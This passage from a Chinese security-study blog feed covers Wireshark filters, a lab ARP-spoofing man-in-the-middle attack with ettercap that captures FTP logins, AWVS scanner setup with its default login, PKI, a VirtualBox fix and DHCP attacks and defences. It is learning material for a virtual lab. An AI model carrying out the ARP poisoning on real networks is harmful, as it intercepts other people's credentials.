            <tag> Vuejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓包分析-wireshark</title>
      <link href="/2023/03/22/%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90-wireshark/"/>
      <url>/2023/03/22/%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90-wireshark/</url>
      
        <content type="html"><![CDATA[<p>WireShark是一个网络封包分析软件，可以直接与网卡进行数据报文交互。是一个非常强大的抓包工具。</p><h2 id="软件的安装">软件的安装</h2><p>个人环境为：Manjaro Linux X86_64</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S wireshark-qt</span><br></pre></td></tr></table></figure><p>我们需要使用Root权限去打开WireShark，否则会无法抓取到我们网卡的网络封包，例如</p><p><img src="https://image.icewindy.cn/202303231726229.png" alt="image.png"></p><p>我们有两种方式的通过Root权限打开WireShark，第一种是在命令行通过<code>sudo wireshark &amp;</code>执行，但是控制台关闭WireShark也会关闭。</p><p>第二种是使用<code>sudo</code>的图形化版本<code>gksu</code>，然后在wireshark的<code>.desktop</code>内修改<code>Excu</code></p><ol><li>安装<code>gksu</code></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S gksu</span><br></pre></td></tr></table></figure><ol start="2"><li>打开<code>/usr/share/applications</code>，用编辑器打开WireShark的快捷方式，将<code>Excu</code>一行修改成这样</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec=gksu wireshark %f</span><br></pre></td></tr></table></figure><p>接下来我们打开命令行会看到这样的窗口</p><p><img src="https://image.icewindy.cn/202303231733061.png" alt="image.png"></p><p>证明成功，输入密码打开即可看到我们的网卡。</p><h2 id="基础使用">基础使用</h2><p>首先我们选到<code>捕获</code>-<code>选项</code></p><p><img src="https://image.icewindy.cn/202303232059703.png" alt=""></p><p>这里会展示出所有的接口，展开接口我们会看到我们的ip地址，通过这个地址，我们可以找到我们的网卡。选择网卡，点击开始，WireShark就会开启捕获流经的数据包</p><p><img src="https://image.icewindy.cn/202303232101857.png" alt="image.png"></p><p>为了方便我们查看，WireShark将不同数据包分成不同颜色以便分辨（虽然我没啥用）。我们来测试一下抓包，比如我们尝试<code>ping baidu.com</code></p><ol><li>执行需要抓包操作</li><li>我们可以通过过滤栏设置过滤条件筛选我们需要的数据包，具体的筛选操作我们在下面提到。我们这里使用<code>icmp</code>，筛选到我们发出的ping操作</li></ol><p><img src="https://image.icewindy.cn/202303232108168.png" alt="image.png"></p><h2 id="主要界面">主要界面</h2><p>过滤器。用于设置过滤条件筛选数据包</p><p><img src="https://image.icewindy.cn/202303232214598.png" alt="image.png"></p><p>数据包列表，用于显示捕获到的数据包。不同协议数据包使用不同颜色进行区分；</p><p>信息从左到右分别是编号，时间戳，源地址，目标地址，协议，长度，信息</p><p><img src="https://image.icewindy.cn/202303232215935.png" alt="image.png"></p><p>数据包详细信息。在数据包列表选择指定的数据包，在数据包中会有详细信息内容。可以用于查看协议中的每一个字段。其内容分别为：</p><ul><li>Frame：物理层数据帧概况</li><li>Ethernet II：数据链路层以太网帧头部信息</li><li>Internet Protocol Version 4（IPv4）：网络层IP包头信息</li><li>Transmission Control Protocol：传输层的数据短头部信息，此处是TCP，User Datagram Protocol为UDP</li><li>Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议HTTP</li></ul><p><img src="https://image.icewindy.cn/202303232231494.png" alt="image.png"></p><p>数据包字节区</p><p><img src="https://image.icewindy.cn/202303232234194.png" alt="image.png"></p><h2 id="过滤器">过滤器</h2><p>WiresShark具有两种过滤器。值得我们注意的是，<strong>两种过滤器的语法都有所不同</strong>，捕获过滤器（抓包前）和显示过滤器（抓包后）的语法具有一定的区别。</p><h3 id="捕获过滤器">捕获过滤器</h3><p>捕获过滤器的语法格式为</p><p><code>&lt;Protocol&gt; &lt;Direction&gt; &lt;Host&gt; &lt;Value&gt; &lt;Logical Operation&gt; &lt;other expression&gt;</code></p><ul><li>Protocol：协议。若未指明协议，则为默认使用所有支持的协议。</li><li>DIrecion：方向。用于指定来源或目的地。取值有<code>src(来源)、dst(目的地)</code>以及<code>src and dst</code>和<code>src or dst</code>。默认会使用<code>src or dst</code></li><li>Host(s)：主机地址。</li><li>Logical Operation：逻辑运算。<ul><li>and 与</li><li>or 或</li><li>not 非</li><li>() 改变优先级。默认优先级为not最高，从左至右运算</li></ul></li><li>Other expression：其他表达式。</li></ul><h4 id="基于类型过滤">基于类型过滤</h4><p>可能使用的类型有主机host，网段net，端口port，端口范围portrange，特殊类型</p><ol><li><p>主机Host<br>捕获主机10.0.0.1的包：host 10.0.0.1</p></li><li><p>网段net<br>后面可以跟的值有三种形式：net mask CIDR</p><ul><li>net:<br>net 10.0.0.0 <a href="//xn--255-iq0f38ib8jvp2b.255.255.255">//对应掩码255.255.255.255</a><br>net 10.0.0   <a href="//xn--255-iq0f38ib8jvp2b.255.255.0">//对应掩码255.255.255.0</a><br>…类推</li><li>mask:<br>net 10.0.0.0 mask 255.255.255.0</li><li>CIDR:<br>net 10.0.0.0/24</li></ul></li><li><p>端口port<br>捕获端口为80的包：port 80</p></li><li><p>端口范围portrange<br>捕获端口范围为1-100的包：portrange 1-100</p></li><li><p>特殊类型 gateway Host</p></li></ol><h4 id="基于方向过滤">基于方向过滤</h4><p>可以在host、net、port、portrange前添加这些关键词</p><ol><li><p>源src<br>捕获源地址为10.0.0.1的数据包：src host 10.0.0.1<br>其他3个都是类似如此使用，不再作出演示</p></li><li><p>目标dst</p></li><li><p>源或者目标src or dst</p></li><li><p>源和目标src and dst</p></li><li><p>特殊方向<br>除了上述4种，还有两种特殊方向:</p><ul><li>广播：broadcast</li><li>多播：multicast<br>捕获以太网广播流量：ether broadcast<br>捕获以太网多播流量：ether multicast</li></ul></li></ol><h4 id="基于协议过滤">基于协议过滤</h4><p>WIreShark支持如下协议过滤：</p><p>ether、fddi、 wlan、 <strong>ip(ipv4、ipv6)</strong>、arprarp、decnet、 lat、 sca、 moproc、 mopdl、 <strong>tcp</strong>、<strong>udp</strong></p><p>通过协议与前面的过滤规则逻辑运算，可以达到精准过滤</p><p>例子：过滤源主机为10.0.0.1并且为tcp协议端口号为80的数据 src host 10.0.0.1 and tcp port 80</p><h4 id="基于数据过滤">基于数据过滤</h4><ol><li><p>长度过滤<br>可以使用less(&lt;=)、greater(&gt;=)关键词<br>长度小于等于12：less 12</p></li><li><p>内容过滤<br>语法格式：<code>proto[expr:size] relop express</code></p><ul><li>proto：协议</li><li>expr：指定协议的偏移地址*</li><li>size：指定数据长度</li><li>relop：运算符，<br>关系运算符有 <code>&gt;,&lt;,&gt;=,&lt;=,==,!=</code><br>二进制运算符有 <code>+，-，*，/，%，&amp;，|，^,&lt;&lt;,&gt;&gt;</code></li></ul><p>协议的偏移地址：指在网络数据包中用于标识数据包中所包含的协议类型的字段的位置偏移量。这个偏移地址的值通常是一个固定的值，以字节为单位表示，用于从数据包的开始位置或数据链路层的头部开始计算。</p></li></ol><h3 id="显示过滤器">显示过滤器</h3><p>这里只列举出常见的显示过滤器规则</p><h4 id="地址过滤">地址过滤</h4><ul><li><p>对源地址、目的地址过滤<br>ip.src == 10.0.0.1    ip.dst == 10.0.0.1</p></li><li><p>对源地址或者目的地址过滤（or）<br>ip.addr == 10.0.0.1</p></li><li><p>排除某个地址的数据包<br>!(ip.addr == 10.0.0.1)</p></li></ul><h4 id="端口过滤">端口过滤</h4><p>传输层协议名(tcp、udp).端口方向 值大小判断 端口号</p><ul><li><p>对源端口、目的端口过滤<br>tcp.srcport == 80    tcp.dstport == 80</p></li><li><p>对源端口或者目标端口过滤（or）<br>tcp.port == 80</p></li><li><p>大于某个端口过滤<br>tcp.port &lt;= 100</p></li></ul><h4 id="协议过滤">协议过滤</h4><p>直接在过滤框内输入协议名即可</p><p><img src="https://image.icewindy.cn/202303251323154.png" alt="image.png"></p><h4 id="http相关">http相关</h4><ul><li><p>过滤出请求地址中包含“user”的请求<br>http.request.uri contains user</p></li><li><p>过滤域名<br>http.host == <a href="http://www.baidu.com">www.baidu.com</a></p></li><li><p>模糊过滤域名<br>http.host contains baidu</p></li><li><p>过滤content_type类型<br>http.content_type == ‘text/html’</p></li><li><p>过滤请求方法<br>http.request.method == get</p></li><li><p>过滤响应码<br>http.request.code == 200</p></li><li><p>过滤含有特定内容的cookie数据包<br>http.cookie contains userid</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全学习（6）：中间人攻击</title>
      <link href="/2023/03/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%886%EF%BC%89%EF%BC%9A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2023/03/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%886%EF%BC%89%EF%BC%9A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>主要教程为利用Kali系统模拟攻击者，利用中间人的攻击手段获取用户登录的用户与密码。</p><p>（请勿在无授权情况下测试！）</p><h2 id="环境介绍">环境介绍</h2><ol><li>设备:均在虚拟环境下<br>WindowsServer2022 ---- 模拟WEB及FTP服务器<br>Windows10                 ---- 模拟客户机<br>Kali                              ---- 攻击机</li><li>工具：ettercap</li><li>设备拓扑结构：三台设备在同一网络下，互相可以通讯</li></ol><h2 id="攻击基本原理">攻击基本原理</h2><ol><li>利用的ARP协议漏洞：后到达的ARP协议包会更新ARP缓存表</li><li>ARP协议原理：(为了获取接受目标的MAC地址)<ul><li>发送机发送ARP广播请求</li><li>目标机发送ARP单播应答</li></ul></li><li>攻击人通过发送虚假的ARP应答实现ARP缓存投毒，而其他设备无法对其进行身份（真伪）验证</li></ol><p>因此中间人攻击又称ARP欺骗攻击。</p><h2 id="流程">流程</h2><h3 id="调整网络">调整网络</h3><p>首先我们开启我们的虚拟机，并设置到同一网段内：</p><ul><li>Windows10 ----- 10.1.1.1</li><li>KaliLinux ----- 10.1.1.2</li><li>Windows2022 ----- 10.1.1.3</li></ul><h3 id="搭建ftp服务器">搭建FTP服务器</h3><p>打开Windows2022，点开管理面板，添加角色与功能，选择IIS，点上FTP服务，安装。</p><p><img src="https://image.icewindy.cn/202303202110337.png" alt="image.png"></p><p>点开工具，找到IIS</p><p><img src="https://image.icewindy.cn/202303202358964.png" alt="image.png"></p><p>完成添加FTP站点后，我们关闭它的匿名登录，开启一般登录。然后我们创建一个user给我们客户机作为帐号。打开cmd</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user &#123;user name&#125; &#123;user password&#125; /add</span><br></pre></td></tr></table></figure><p>即可添加一个账户。然后我们打开我们共享的那个FTP文件夹，在安全中给予我们的新用户访问权限，接下来我们去客户机验证是否可用</p><p><img src="https://image.icewindy.cn/202303210007472.png" alt="image.png"></p><p>输入帐号密码，发现可用，即可完成服务搭建。</p><h2 id="开启arp欺骗及sniff嗅探">开启ARP欺骗及sniff嗅探</h2><p>打开Kali Linux，开启工具<code>Ettercap</code>，选择网卡<code>eth0</code>（我们这里只有这个），然后点击对号确定</p><p><img src="https://image.icewindy.cn/202303210016042.png" alt="image.png"></p><p>然后打开左上角的Host list；接着选择右上角三个点-Hosts-Scan for hosts</p><p><img src="https://image.icewindy.cn/202303210018444.png" alt="image.png"></p><p>接着我们就可以扫描到我们另外两台虚拟机了</p><p><img src="https://image.icewindy.cn/202303210018463.png" alt="image.png"></p><p>选择<code>10.1.1.1</code>，然后<code>Add to Target 1</code>，接着选择<code>10.1.1.3</code>，然后<code>Add to Target2</code>；添加完成目标后，我们开始投毒：找到右上角的小地球，选择<code>ARP posisoning</code>，即可完成投毒。</p><p><img src="https://image.icewindy.cn/202303210022130.png" alt="image.png"></p><p>如何检验是否投毒成功呢，我们在客户机上使用<code>arp -a</code>查看ARP缓存表</p><p><img src="https://image.icewindy.cn/202303210024476.png" alt="image.png"></p><p>发现<code>10.1.1.2</code>和<code>10.1.1.3</code>的MAC地址一致，证明投毒成功。接下来我们尝试获得帐号密码，在客户机上登录FTP服务器，然后我们在Kali上就成功发现获取到了帐号密码</p><p><img src="https://image.icewindy.cn/202303210026847.png" alt="image.png"></p><p>由于FTP为明文传输，因此已经抓取了正确的帐号密码了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 攻击原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全学习（5）：AWVS</title>
      <link href="/2023/03/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%885%EF%BC%89%EF%BC%9AAWVS/"/>
      <url>/2023/03/19/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%885%EF%BC%89%EF%BC%9AAWVS/</url>
      
        <content type="html"><![CDATA[<p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，是一个针对web服务的扫描工具。</p><p>新版的AWVS是通过网页的方式使用，前后端分离，因此可以用Docker部署，这里我就选择使用Docker部署的方式来安装。</p><h2 id="使用docker部署">使用Docker部署</h2><ol><li>拉取下载镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br></pre></td></tr></table></figure><ol start="2"><li>创建容器，并将3443端口映射到物理即的13443端口</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line">//Windows下可能需要添加一个参数</span><br><span class="line">docker run -it -d --cap-add LINUX_IMMUTABLE -p 13443:3443 secfa/docker-awvs</span><br></pre></td></tr></table></figure><ol start="3"><li>访问awvs，在浏览器中打开<code>https://127.0.0.1:13443</code>（其中127.0.0.1可以替换为Docker所在服务器的地址）</li></ol><p>由于https的原因，首次访问这个网页会弹出不信任，直接无视访问即可。若是Google Chrome可能相对更麻烦一些，建议自行查看相关问题解决方案。</p><p>默认的登录账户密码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@admin.com</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure><ol start="4"><li>若发现网页为英文，可以通过点击右上角的用户，选择<code>Profile</code></li></ol><p><img src="https://image.icewindy.cn/202303190145441.png" alt="image.png"></p><p>进入页面后，在Language选择简体，然后Last Name随便填写一个，否则无法保存，然后点击右上角的save即可</p><p><img src="https://image.icewindy.cn/202303190147011.png" alt="image.png"></p><h2 id="基础扫描">基础扫描</h2><p>AWVS专用测试网站：<a href="http://testphp.vulnweb.com">http://testphp.vulnweb.com</a></p><p>首先我们需要添加目标，点击目标，选择添加目标，把测试网站放进入，点击保存即可。</p><p><img src="https://image.icewindy.cn/202303190158074.png" alt="image.png"></p><p>我们可以对我们要扫描的目标进行设置扫描速度以及优先度（业务关键性）</p><p>接下来我们选择扫描，新建扫描，选择我们的目标，点击扫描</p><p><img src="https://image.icewindy.cn/202303190206495.png" alt="image.png"></p><p>然后可以选择我们需要的扫描的配置文件，是否生成报告，以及何时启动扫描或是否重复扫描</p><p><img src="https://image.icewindy.cn/202303190207205.png" alt="image.png"></p><p>接下来我们可以在漏洞或者仪表盘看到我们这次简单扫描的结果了。</p><h2 id="awvs-api">AWVS API</h2><p>AWVS除了使用网页图形化扫描，还可以通过编写Python脚本或者其他脚本来利用AWVS API进行扫描</p><p>AWVS接口可以参考：<a href="https://www.sqlsec.com/2020/04/awvsapi.html">https://www.sqlsec.com/2020/04/awvsapi.html</a></p><p>根据提供的接口，简单写了个Python脚本：</p><p><a href="https://github.com/IceWindy233/AWVS-Script">https://github.com/IceWindy233/AWVS-Script</a></p><h2 id="忘记密码">忘记密码</h2><p>重新打开页面发现自己忘记密码，于是来更新一下忘记密码的处理方法</p><p>打开docker的控制台，切换目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/acunetix/.acunetix</span><br></pre></td></tr></table></figure><p>目录下有一个<code>change_credentials.sh</code>，运行</p><p><img src="https://image.icewindy.cn/202303301606025.png" alt="image-20230330160619992"></p><p>修改成功后去对应的网站访问，使用刚刚设置好的邮箱与密码即可。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全学习（4）：KPI</title>
      <link href="/2023/03/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%887%EF%BC%89%EF%BC%9AKPI/"/>
      <url>/2023/03/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%887%EF%BC%89%EF%BC%9AKPI/</url>
      
        <content type="html"><![CDATA[<h2 id="pki">PKI</h2><p>PKI：Public Key Infrastructure 公钥基础设施</p><p>作用：通过加密技术和数字签名保证信息的安全</p><p>组成：公钥加密技术、数字证书、CA、RA</p><p>信息安全三要素</p><ul><li>机密性</li><li>完整性</li><li>身份验证/操作的不可否认性</li></ul><p>用到PKI的领域</p><ul><li>SSL/HTTPS</li><li>IPsecVPN</li></ul><h2 id="公钥加密技术">公钥加密技术</h2><p>作用：实现对信息加密、数字签名等安全保障</p><p>加密算法：</p><ol><li><p>对称加密算法（DES、3DES、AES…）：加密与解密的密钥一致<br>例：x+5=y，x是原数据/原文，y是密文;其加密与解密密钥都是<code>5</code></p></li><li><p>非对称加密算法（RSA…）</p><ul><li>通信双方各自产生一对公私钥</li><li>双方交换公私钥</li><li>公钥与私钥为互相加解密关系</li><li>公私钥不可互相逆推</li></ul></li></ol><p>数字签名：用自己的私钥对摘要（MD5）加密得出的密文。</p><h2 id="数字证书">数字证书</h2><p>证书是用于保证公钥的合法性，格式遵循X.509标准。</p><p>数字证书包含的信息有：</p><ul><li>使用者的公钥值</li><li>使用者的标识信息（名称、电子邮件等）</li><li>有效期（证书的有效时间）</li><li>颁发者标识信息</li><li>颁发者的数字签名</li></ul><p>数字证书由权威公正的第三方机构，即CA签发。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro和ArchLinux下安装VirtualBox过程以及踩坑</title>
      <link href="/2023/03/17/Manjaro%E5%92%8CArchLinux%E4%B8%8B%E5%AE%89%E8%A3%85VirtualBox%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E8%B8%A9%E5%9D%91/"/>
      <url>/2023/03/17/Manjaro%E5%92%8CArchLinux%E4%B8%8B%E5%AE%89%E8%A3%85VirtualBox%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>安装VirtualBox时，遇到一个启动虚拟机卡在20%的问题。翻了ArchLinux的BBS和Wiki，可算找到了解决方案，疑似是11代Intel的锅。</p><h2 id="安装过程">安装过程</h2><p>首先通过<code>uname -r</code>查看系统的内核版本，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6.1.19-1-MANJARO</span><br></pre></td></tr></table></figure><p>可以查看到我的内核版本是6.1，接下来使用<code>pacman</code>安装VirtualBox</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S virtualbox</span><br></pre></td></tr></table></figure><p>会出现很多选项，选择对应的内核版本即可。接下来我们安装vbox的拓展包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Ss virtualbox-ext-oracle</span><br></pre></td></tr></table></figure><p>然后我们需要重启或者使用命令载入vboxdrv模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe vboxdrv</span><br></pre></td></tr></table></figure><h2 id="问题出现">问题出现</h2><p>当我们打开vbox，创建虚拟机，启动虚拟机时，发现虚拟机的界面卡在了正在启动虚拟机，然后查看vbox页面，卡在了20%。</p><p>（我似乎忘记留存问题的图了，后面复刻问题后再补上）</p><p>经过我查找问题，发现问题似乎出现在11代Intel CPU上，接下来是在BBS和Wiki发现解决问题链接：</p><p><a href="https://wiki.archlinux.org/title/VirtualBox#Freeze_during_virtual_machine_startup_with_11th_generation_Intel_CPU">https://wiki.archlinux.org/title/VirtualBox#Freeze_during_virtual_machine_startup_with_11th_generation_Intel_CPU</a></p><p><a href="https://bbs.archlinux.org/viewtopic.php?id=277500">https://bbs.archlinux.org/viewtopic.php?id=277500</a></p><p>通过这两篇，我经过尝试证明解决方案仍可用，虽然不太能理解为什么需要这样操作。接下来是简述解决方案</p><p>首先我们需要用编辑器通过root权限打开<code>/etc/default/grub</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nvim /etc/default/grub</span><br></pre></td></tr></table></figure><p>找到<code>GRUB_CMDLINE_LINUX_DEFAULT=&quot; &quot;</code>，在原先有的内容上追加<code>ibt=off</code>，例如我的如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash apparmor=1 security=apparmor udev.log_priority=3 ibt=off&quot;</span><br></pre></td></tr></table></figure><p>然后我们需要应用我们对grub的修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><p>接着我们重启计算机，打开虚拟机，即可正常使用</p><p><img src="https://image.icewindy.cn/202303171215736.png" alt=""></p><h2 id="后记">后记</h2><p>我昨天在用中文在互联网里刨了整天屎都没找到任何有效的解决方案，然后今天起床尝试使用英语在搜索引擎检索相关问题表现，翻阅了几个帖子和Wiki后，成功找到了有效可用解决方案。</p><p>emm，不知道怎么描述这种感觉，果然使用中文检索计算机问题只会直通屎山（CSDN包括但不限于）吗？</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全学习（3）：DHCP</title>
      <link href="/2023/03/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%883%EF%BC%89%EF%BC%9ADHCP/"/>
      <url>/2023/03/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%883%EF%BC%89%EF%BC%9ADHCP/</url>
      
        <content type="html"><![CDATA[<h2 id="dhcp">DHCP</h2><p>DHCP具体在这里不会赘述，主要讲DHCP原理、部署、安全。</p><h3 id="dhcp原理">DHCP原理</h3><p>可以称为DHCP租约过程，分为四个步骤</p><ol><li>客户机发生DHCP Discovery(发现)广播包</li></ol><p>客户机广播请求IP地址（包含客户机的MAC地址）</p><ol start="2"><li>服务器响应DHCP Offer广播包</li></ol><p>服务器响应提供IP地址（无子网掩码、网关等参数）</p><ol start="3"><li>客户机发送DHCP Request广播包</li></ol><p>客户机选择IP（也可认为确认使用哪个IP）</p><ol start="4"><li>发送DHCP ACK(确认)广播包</li></ol><p>服务器确定租约，并提供网卡详细参数IP、掩码、网关、DNS、租期等</p><h2 id="dhcp续约">DHCP续约</h2><p>当50%过后，客户机会再次发送DHCP Request包进行续约;</p><p>若服务器未响应，则会继续使用且在87.5%再次发送进行续约，如果仍然无响应，则释放IP地址，重新进行DHCP租约过程获取IP地址。</p><p>当无任何服务器响应时，会自动给自己分配一个<code>169.254.x.x/16</code>（无效IP地址）。</p><h2 id="部署dhcp服务器">部署DHCP服务器</h2><p>使用的服务器版本：Windows Server 2022</p><p>首先我们打开设置，找到应用，选择程序与功能（相关设置）</p><p><img src="https://image.icewindy.cn/202303171441317.png" alt=""></p><p>我们选择启用或关闭Windows功能，按步骤选择DHCP服务器，完成功能的安装。接着我们对虚拟机进行设置，将其设置为内部网络，并创建一个虚拟网络</p><p><img src="https://image.icewindy.cn/202303171445639.png" alt=""></p><p>然后我们进入到WindowsServer的网络连接设置，打开TCP/IP设置</p><p><img src="https://image.icewindy.cn/202303171446799.png" alt=""></p><p>我们需要设置我们的网段，这里我们使用<code>10.1.1.x</code>网段，子网掩码选择<code>255.255.255.0</code>。设置完成后，我们使用netstat -an查看我们服务器的网络状况</p><p><img src="https://image.icewindy.cn/202303171450717.png" alt=""></p><p>发现存在这两个端口，这两个端口就是我们提供DHCP协议服务的端口。</p><p>接下来我们要设置我们的<code>地址池/作用域</code>。我们通过管理工具，选择工具，打开DHCP，出现一个这样的界面</p><p><img src="https://image.icewindy.cn/202303171454877.png" alt=""></p><p>首先我们需要右键IPv4，选择新建作用域，我们可以按照我们的需求分配地址池，我一般习惯从11开始，并且预留结束，即250结束。然后长度选择24</p><p><img src="https://image.icewindy.cn/202303171458946.png" alt=""></p><p>排除ip和租期可以根据自己需求分配。DNS和网关地址都由具体情况而修改。WINS服务器可以直接跳过。即可完成部署。</p><p>接着我们进入客户机，同样修改网络到同一个虚拟网下，开启自动获取IP地址</p><p><img src="https://image.icewindy.cn/202303171518443.png" alt=""></p><p>已成功获取到DHCP分配的地址。</p><p>常见的客户机上关于获取DHCP相关的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /release 释放IP（取消租约）</span><br><span class="line">ipconfig /renew   重新获取IP（有IP时，发送Request续约，无IP时，发送Discovery重新获取IP）</span><br></pre></td></tr></table></figure><p>除了通过命令取消租约，我们还可以通过改成手动配置IP，也可以释放租约。</p><h2 id="地址保留">地址保留</h2><p>当客户机上需要使用动态获取IP地址时，而又需要为他在这个网段固定一个IP地址时，我们会用到地址保留。</p><p>在作用域中，找到保留，右键可以新建一个保留，填入固定的IP地址和MAC地址，即可为对应MAC的地址的在此网段分配固定的IP地址。</p><h2 id="选项优先级">选项优先级</h2><p>首先我们来介绍服务器选项，假设我们在这台DHCP服务器上需要部署多个网段的分配，我们之前提及，我们需要为作用域分配作用域选项，包括DNS服务器、路由器等。</p><p>我们为了简化创建流程我们可以在创建时，把部分设置都留空，然后在作用域的同一层里面我们发现有一个服务器选项。</p><p><img src="https://image.icewindy.cn/202303171539105.png" alt=""></p><p>这个服务器选项会默认继承给作用域内。</p><p>但是我们发现网关这个选项，是没有办法通过在服务器选项中继承下来的，因为每个网段他们的网关都不相同，因此我们要给每个作用域自行设置网关。</p><p>跟面向对象语言中继承的关系很相同，作用域可以重写继承下来的服务器选项，这个就是选项优先级。</p><h2 id="dhcp攻击与防御">DHCP攻击与防御</h2><ol><li>攻击DHCP服务器：频繁的发送伪造的DHCP请求，直到耗尽地址池<br>防御：在交换机上（管理型）的端口上做动态MAC地址绑定</li><li>伪装DHCP服务器攻击：Hack通过将自己部署为DHCP服务器，为客户机提供非法IP地址<br>防御：在交换机上（管理型），除合法的DHCP服务器所在接口外，全部设置为禁止发送DHCP Offer包</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试学习（2）：在docker下搭建Kali-Linux环境</title>
      <link href="/2023/03/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89%EF%BC%9A%E5%9C%A8docker%E4%B8%8B%E6%90%AD%E5%BB%BAKali-Linux%E7%8E%AF%E5%A2%83/"/>
      <url>/2023/03/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89%EF%BC%9A%E5%9C%A8docker%E4%B8%8B%E6%90%AD%E5%BB%BAKali-Linux%E7%8E%AF%E5%A2%83/</url>
      
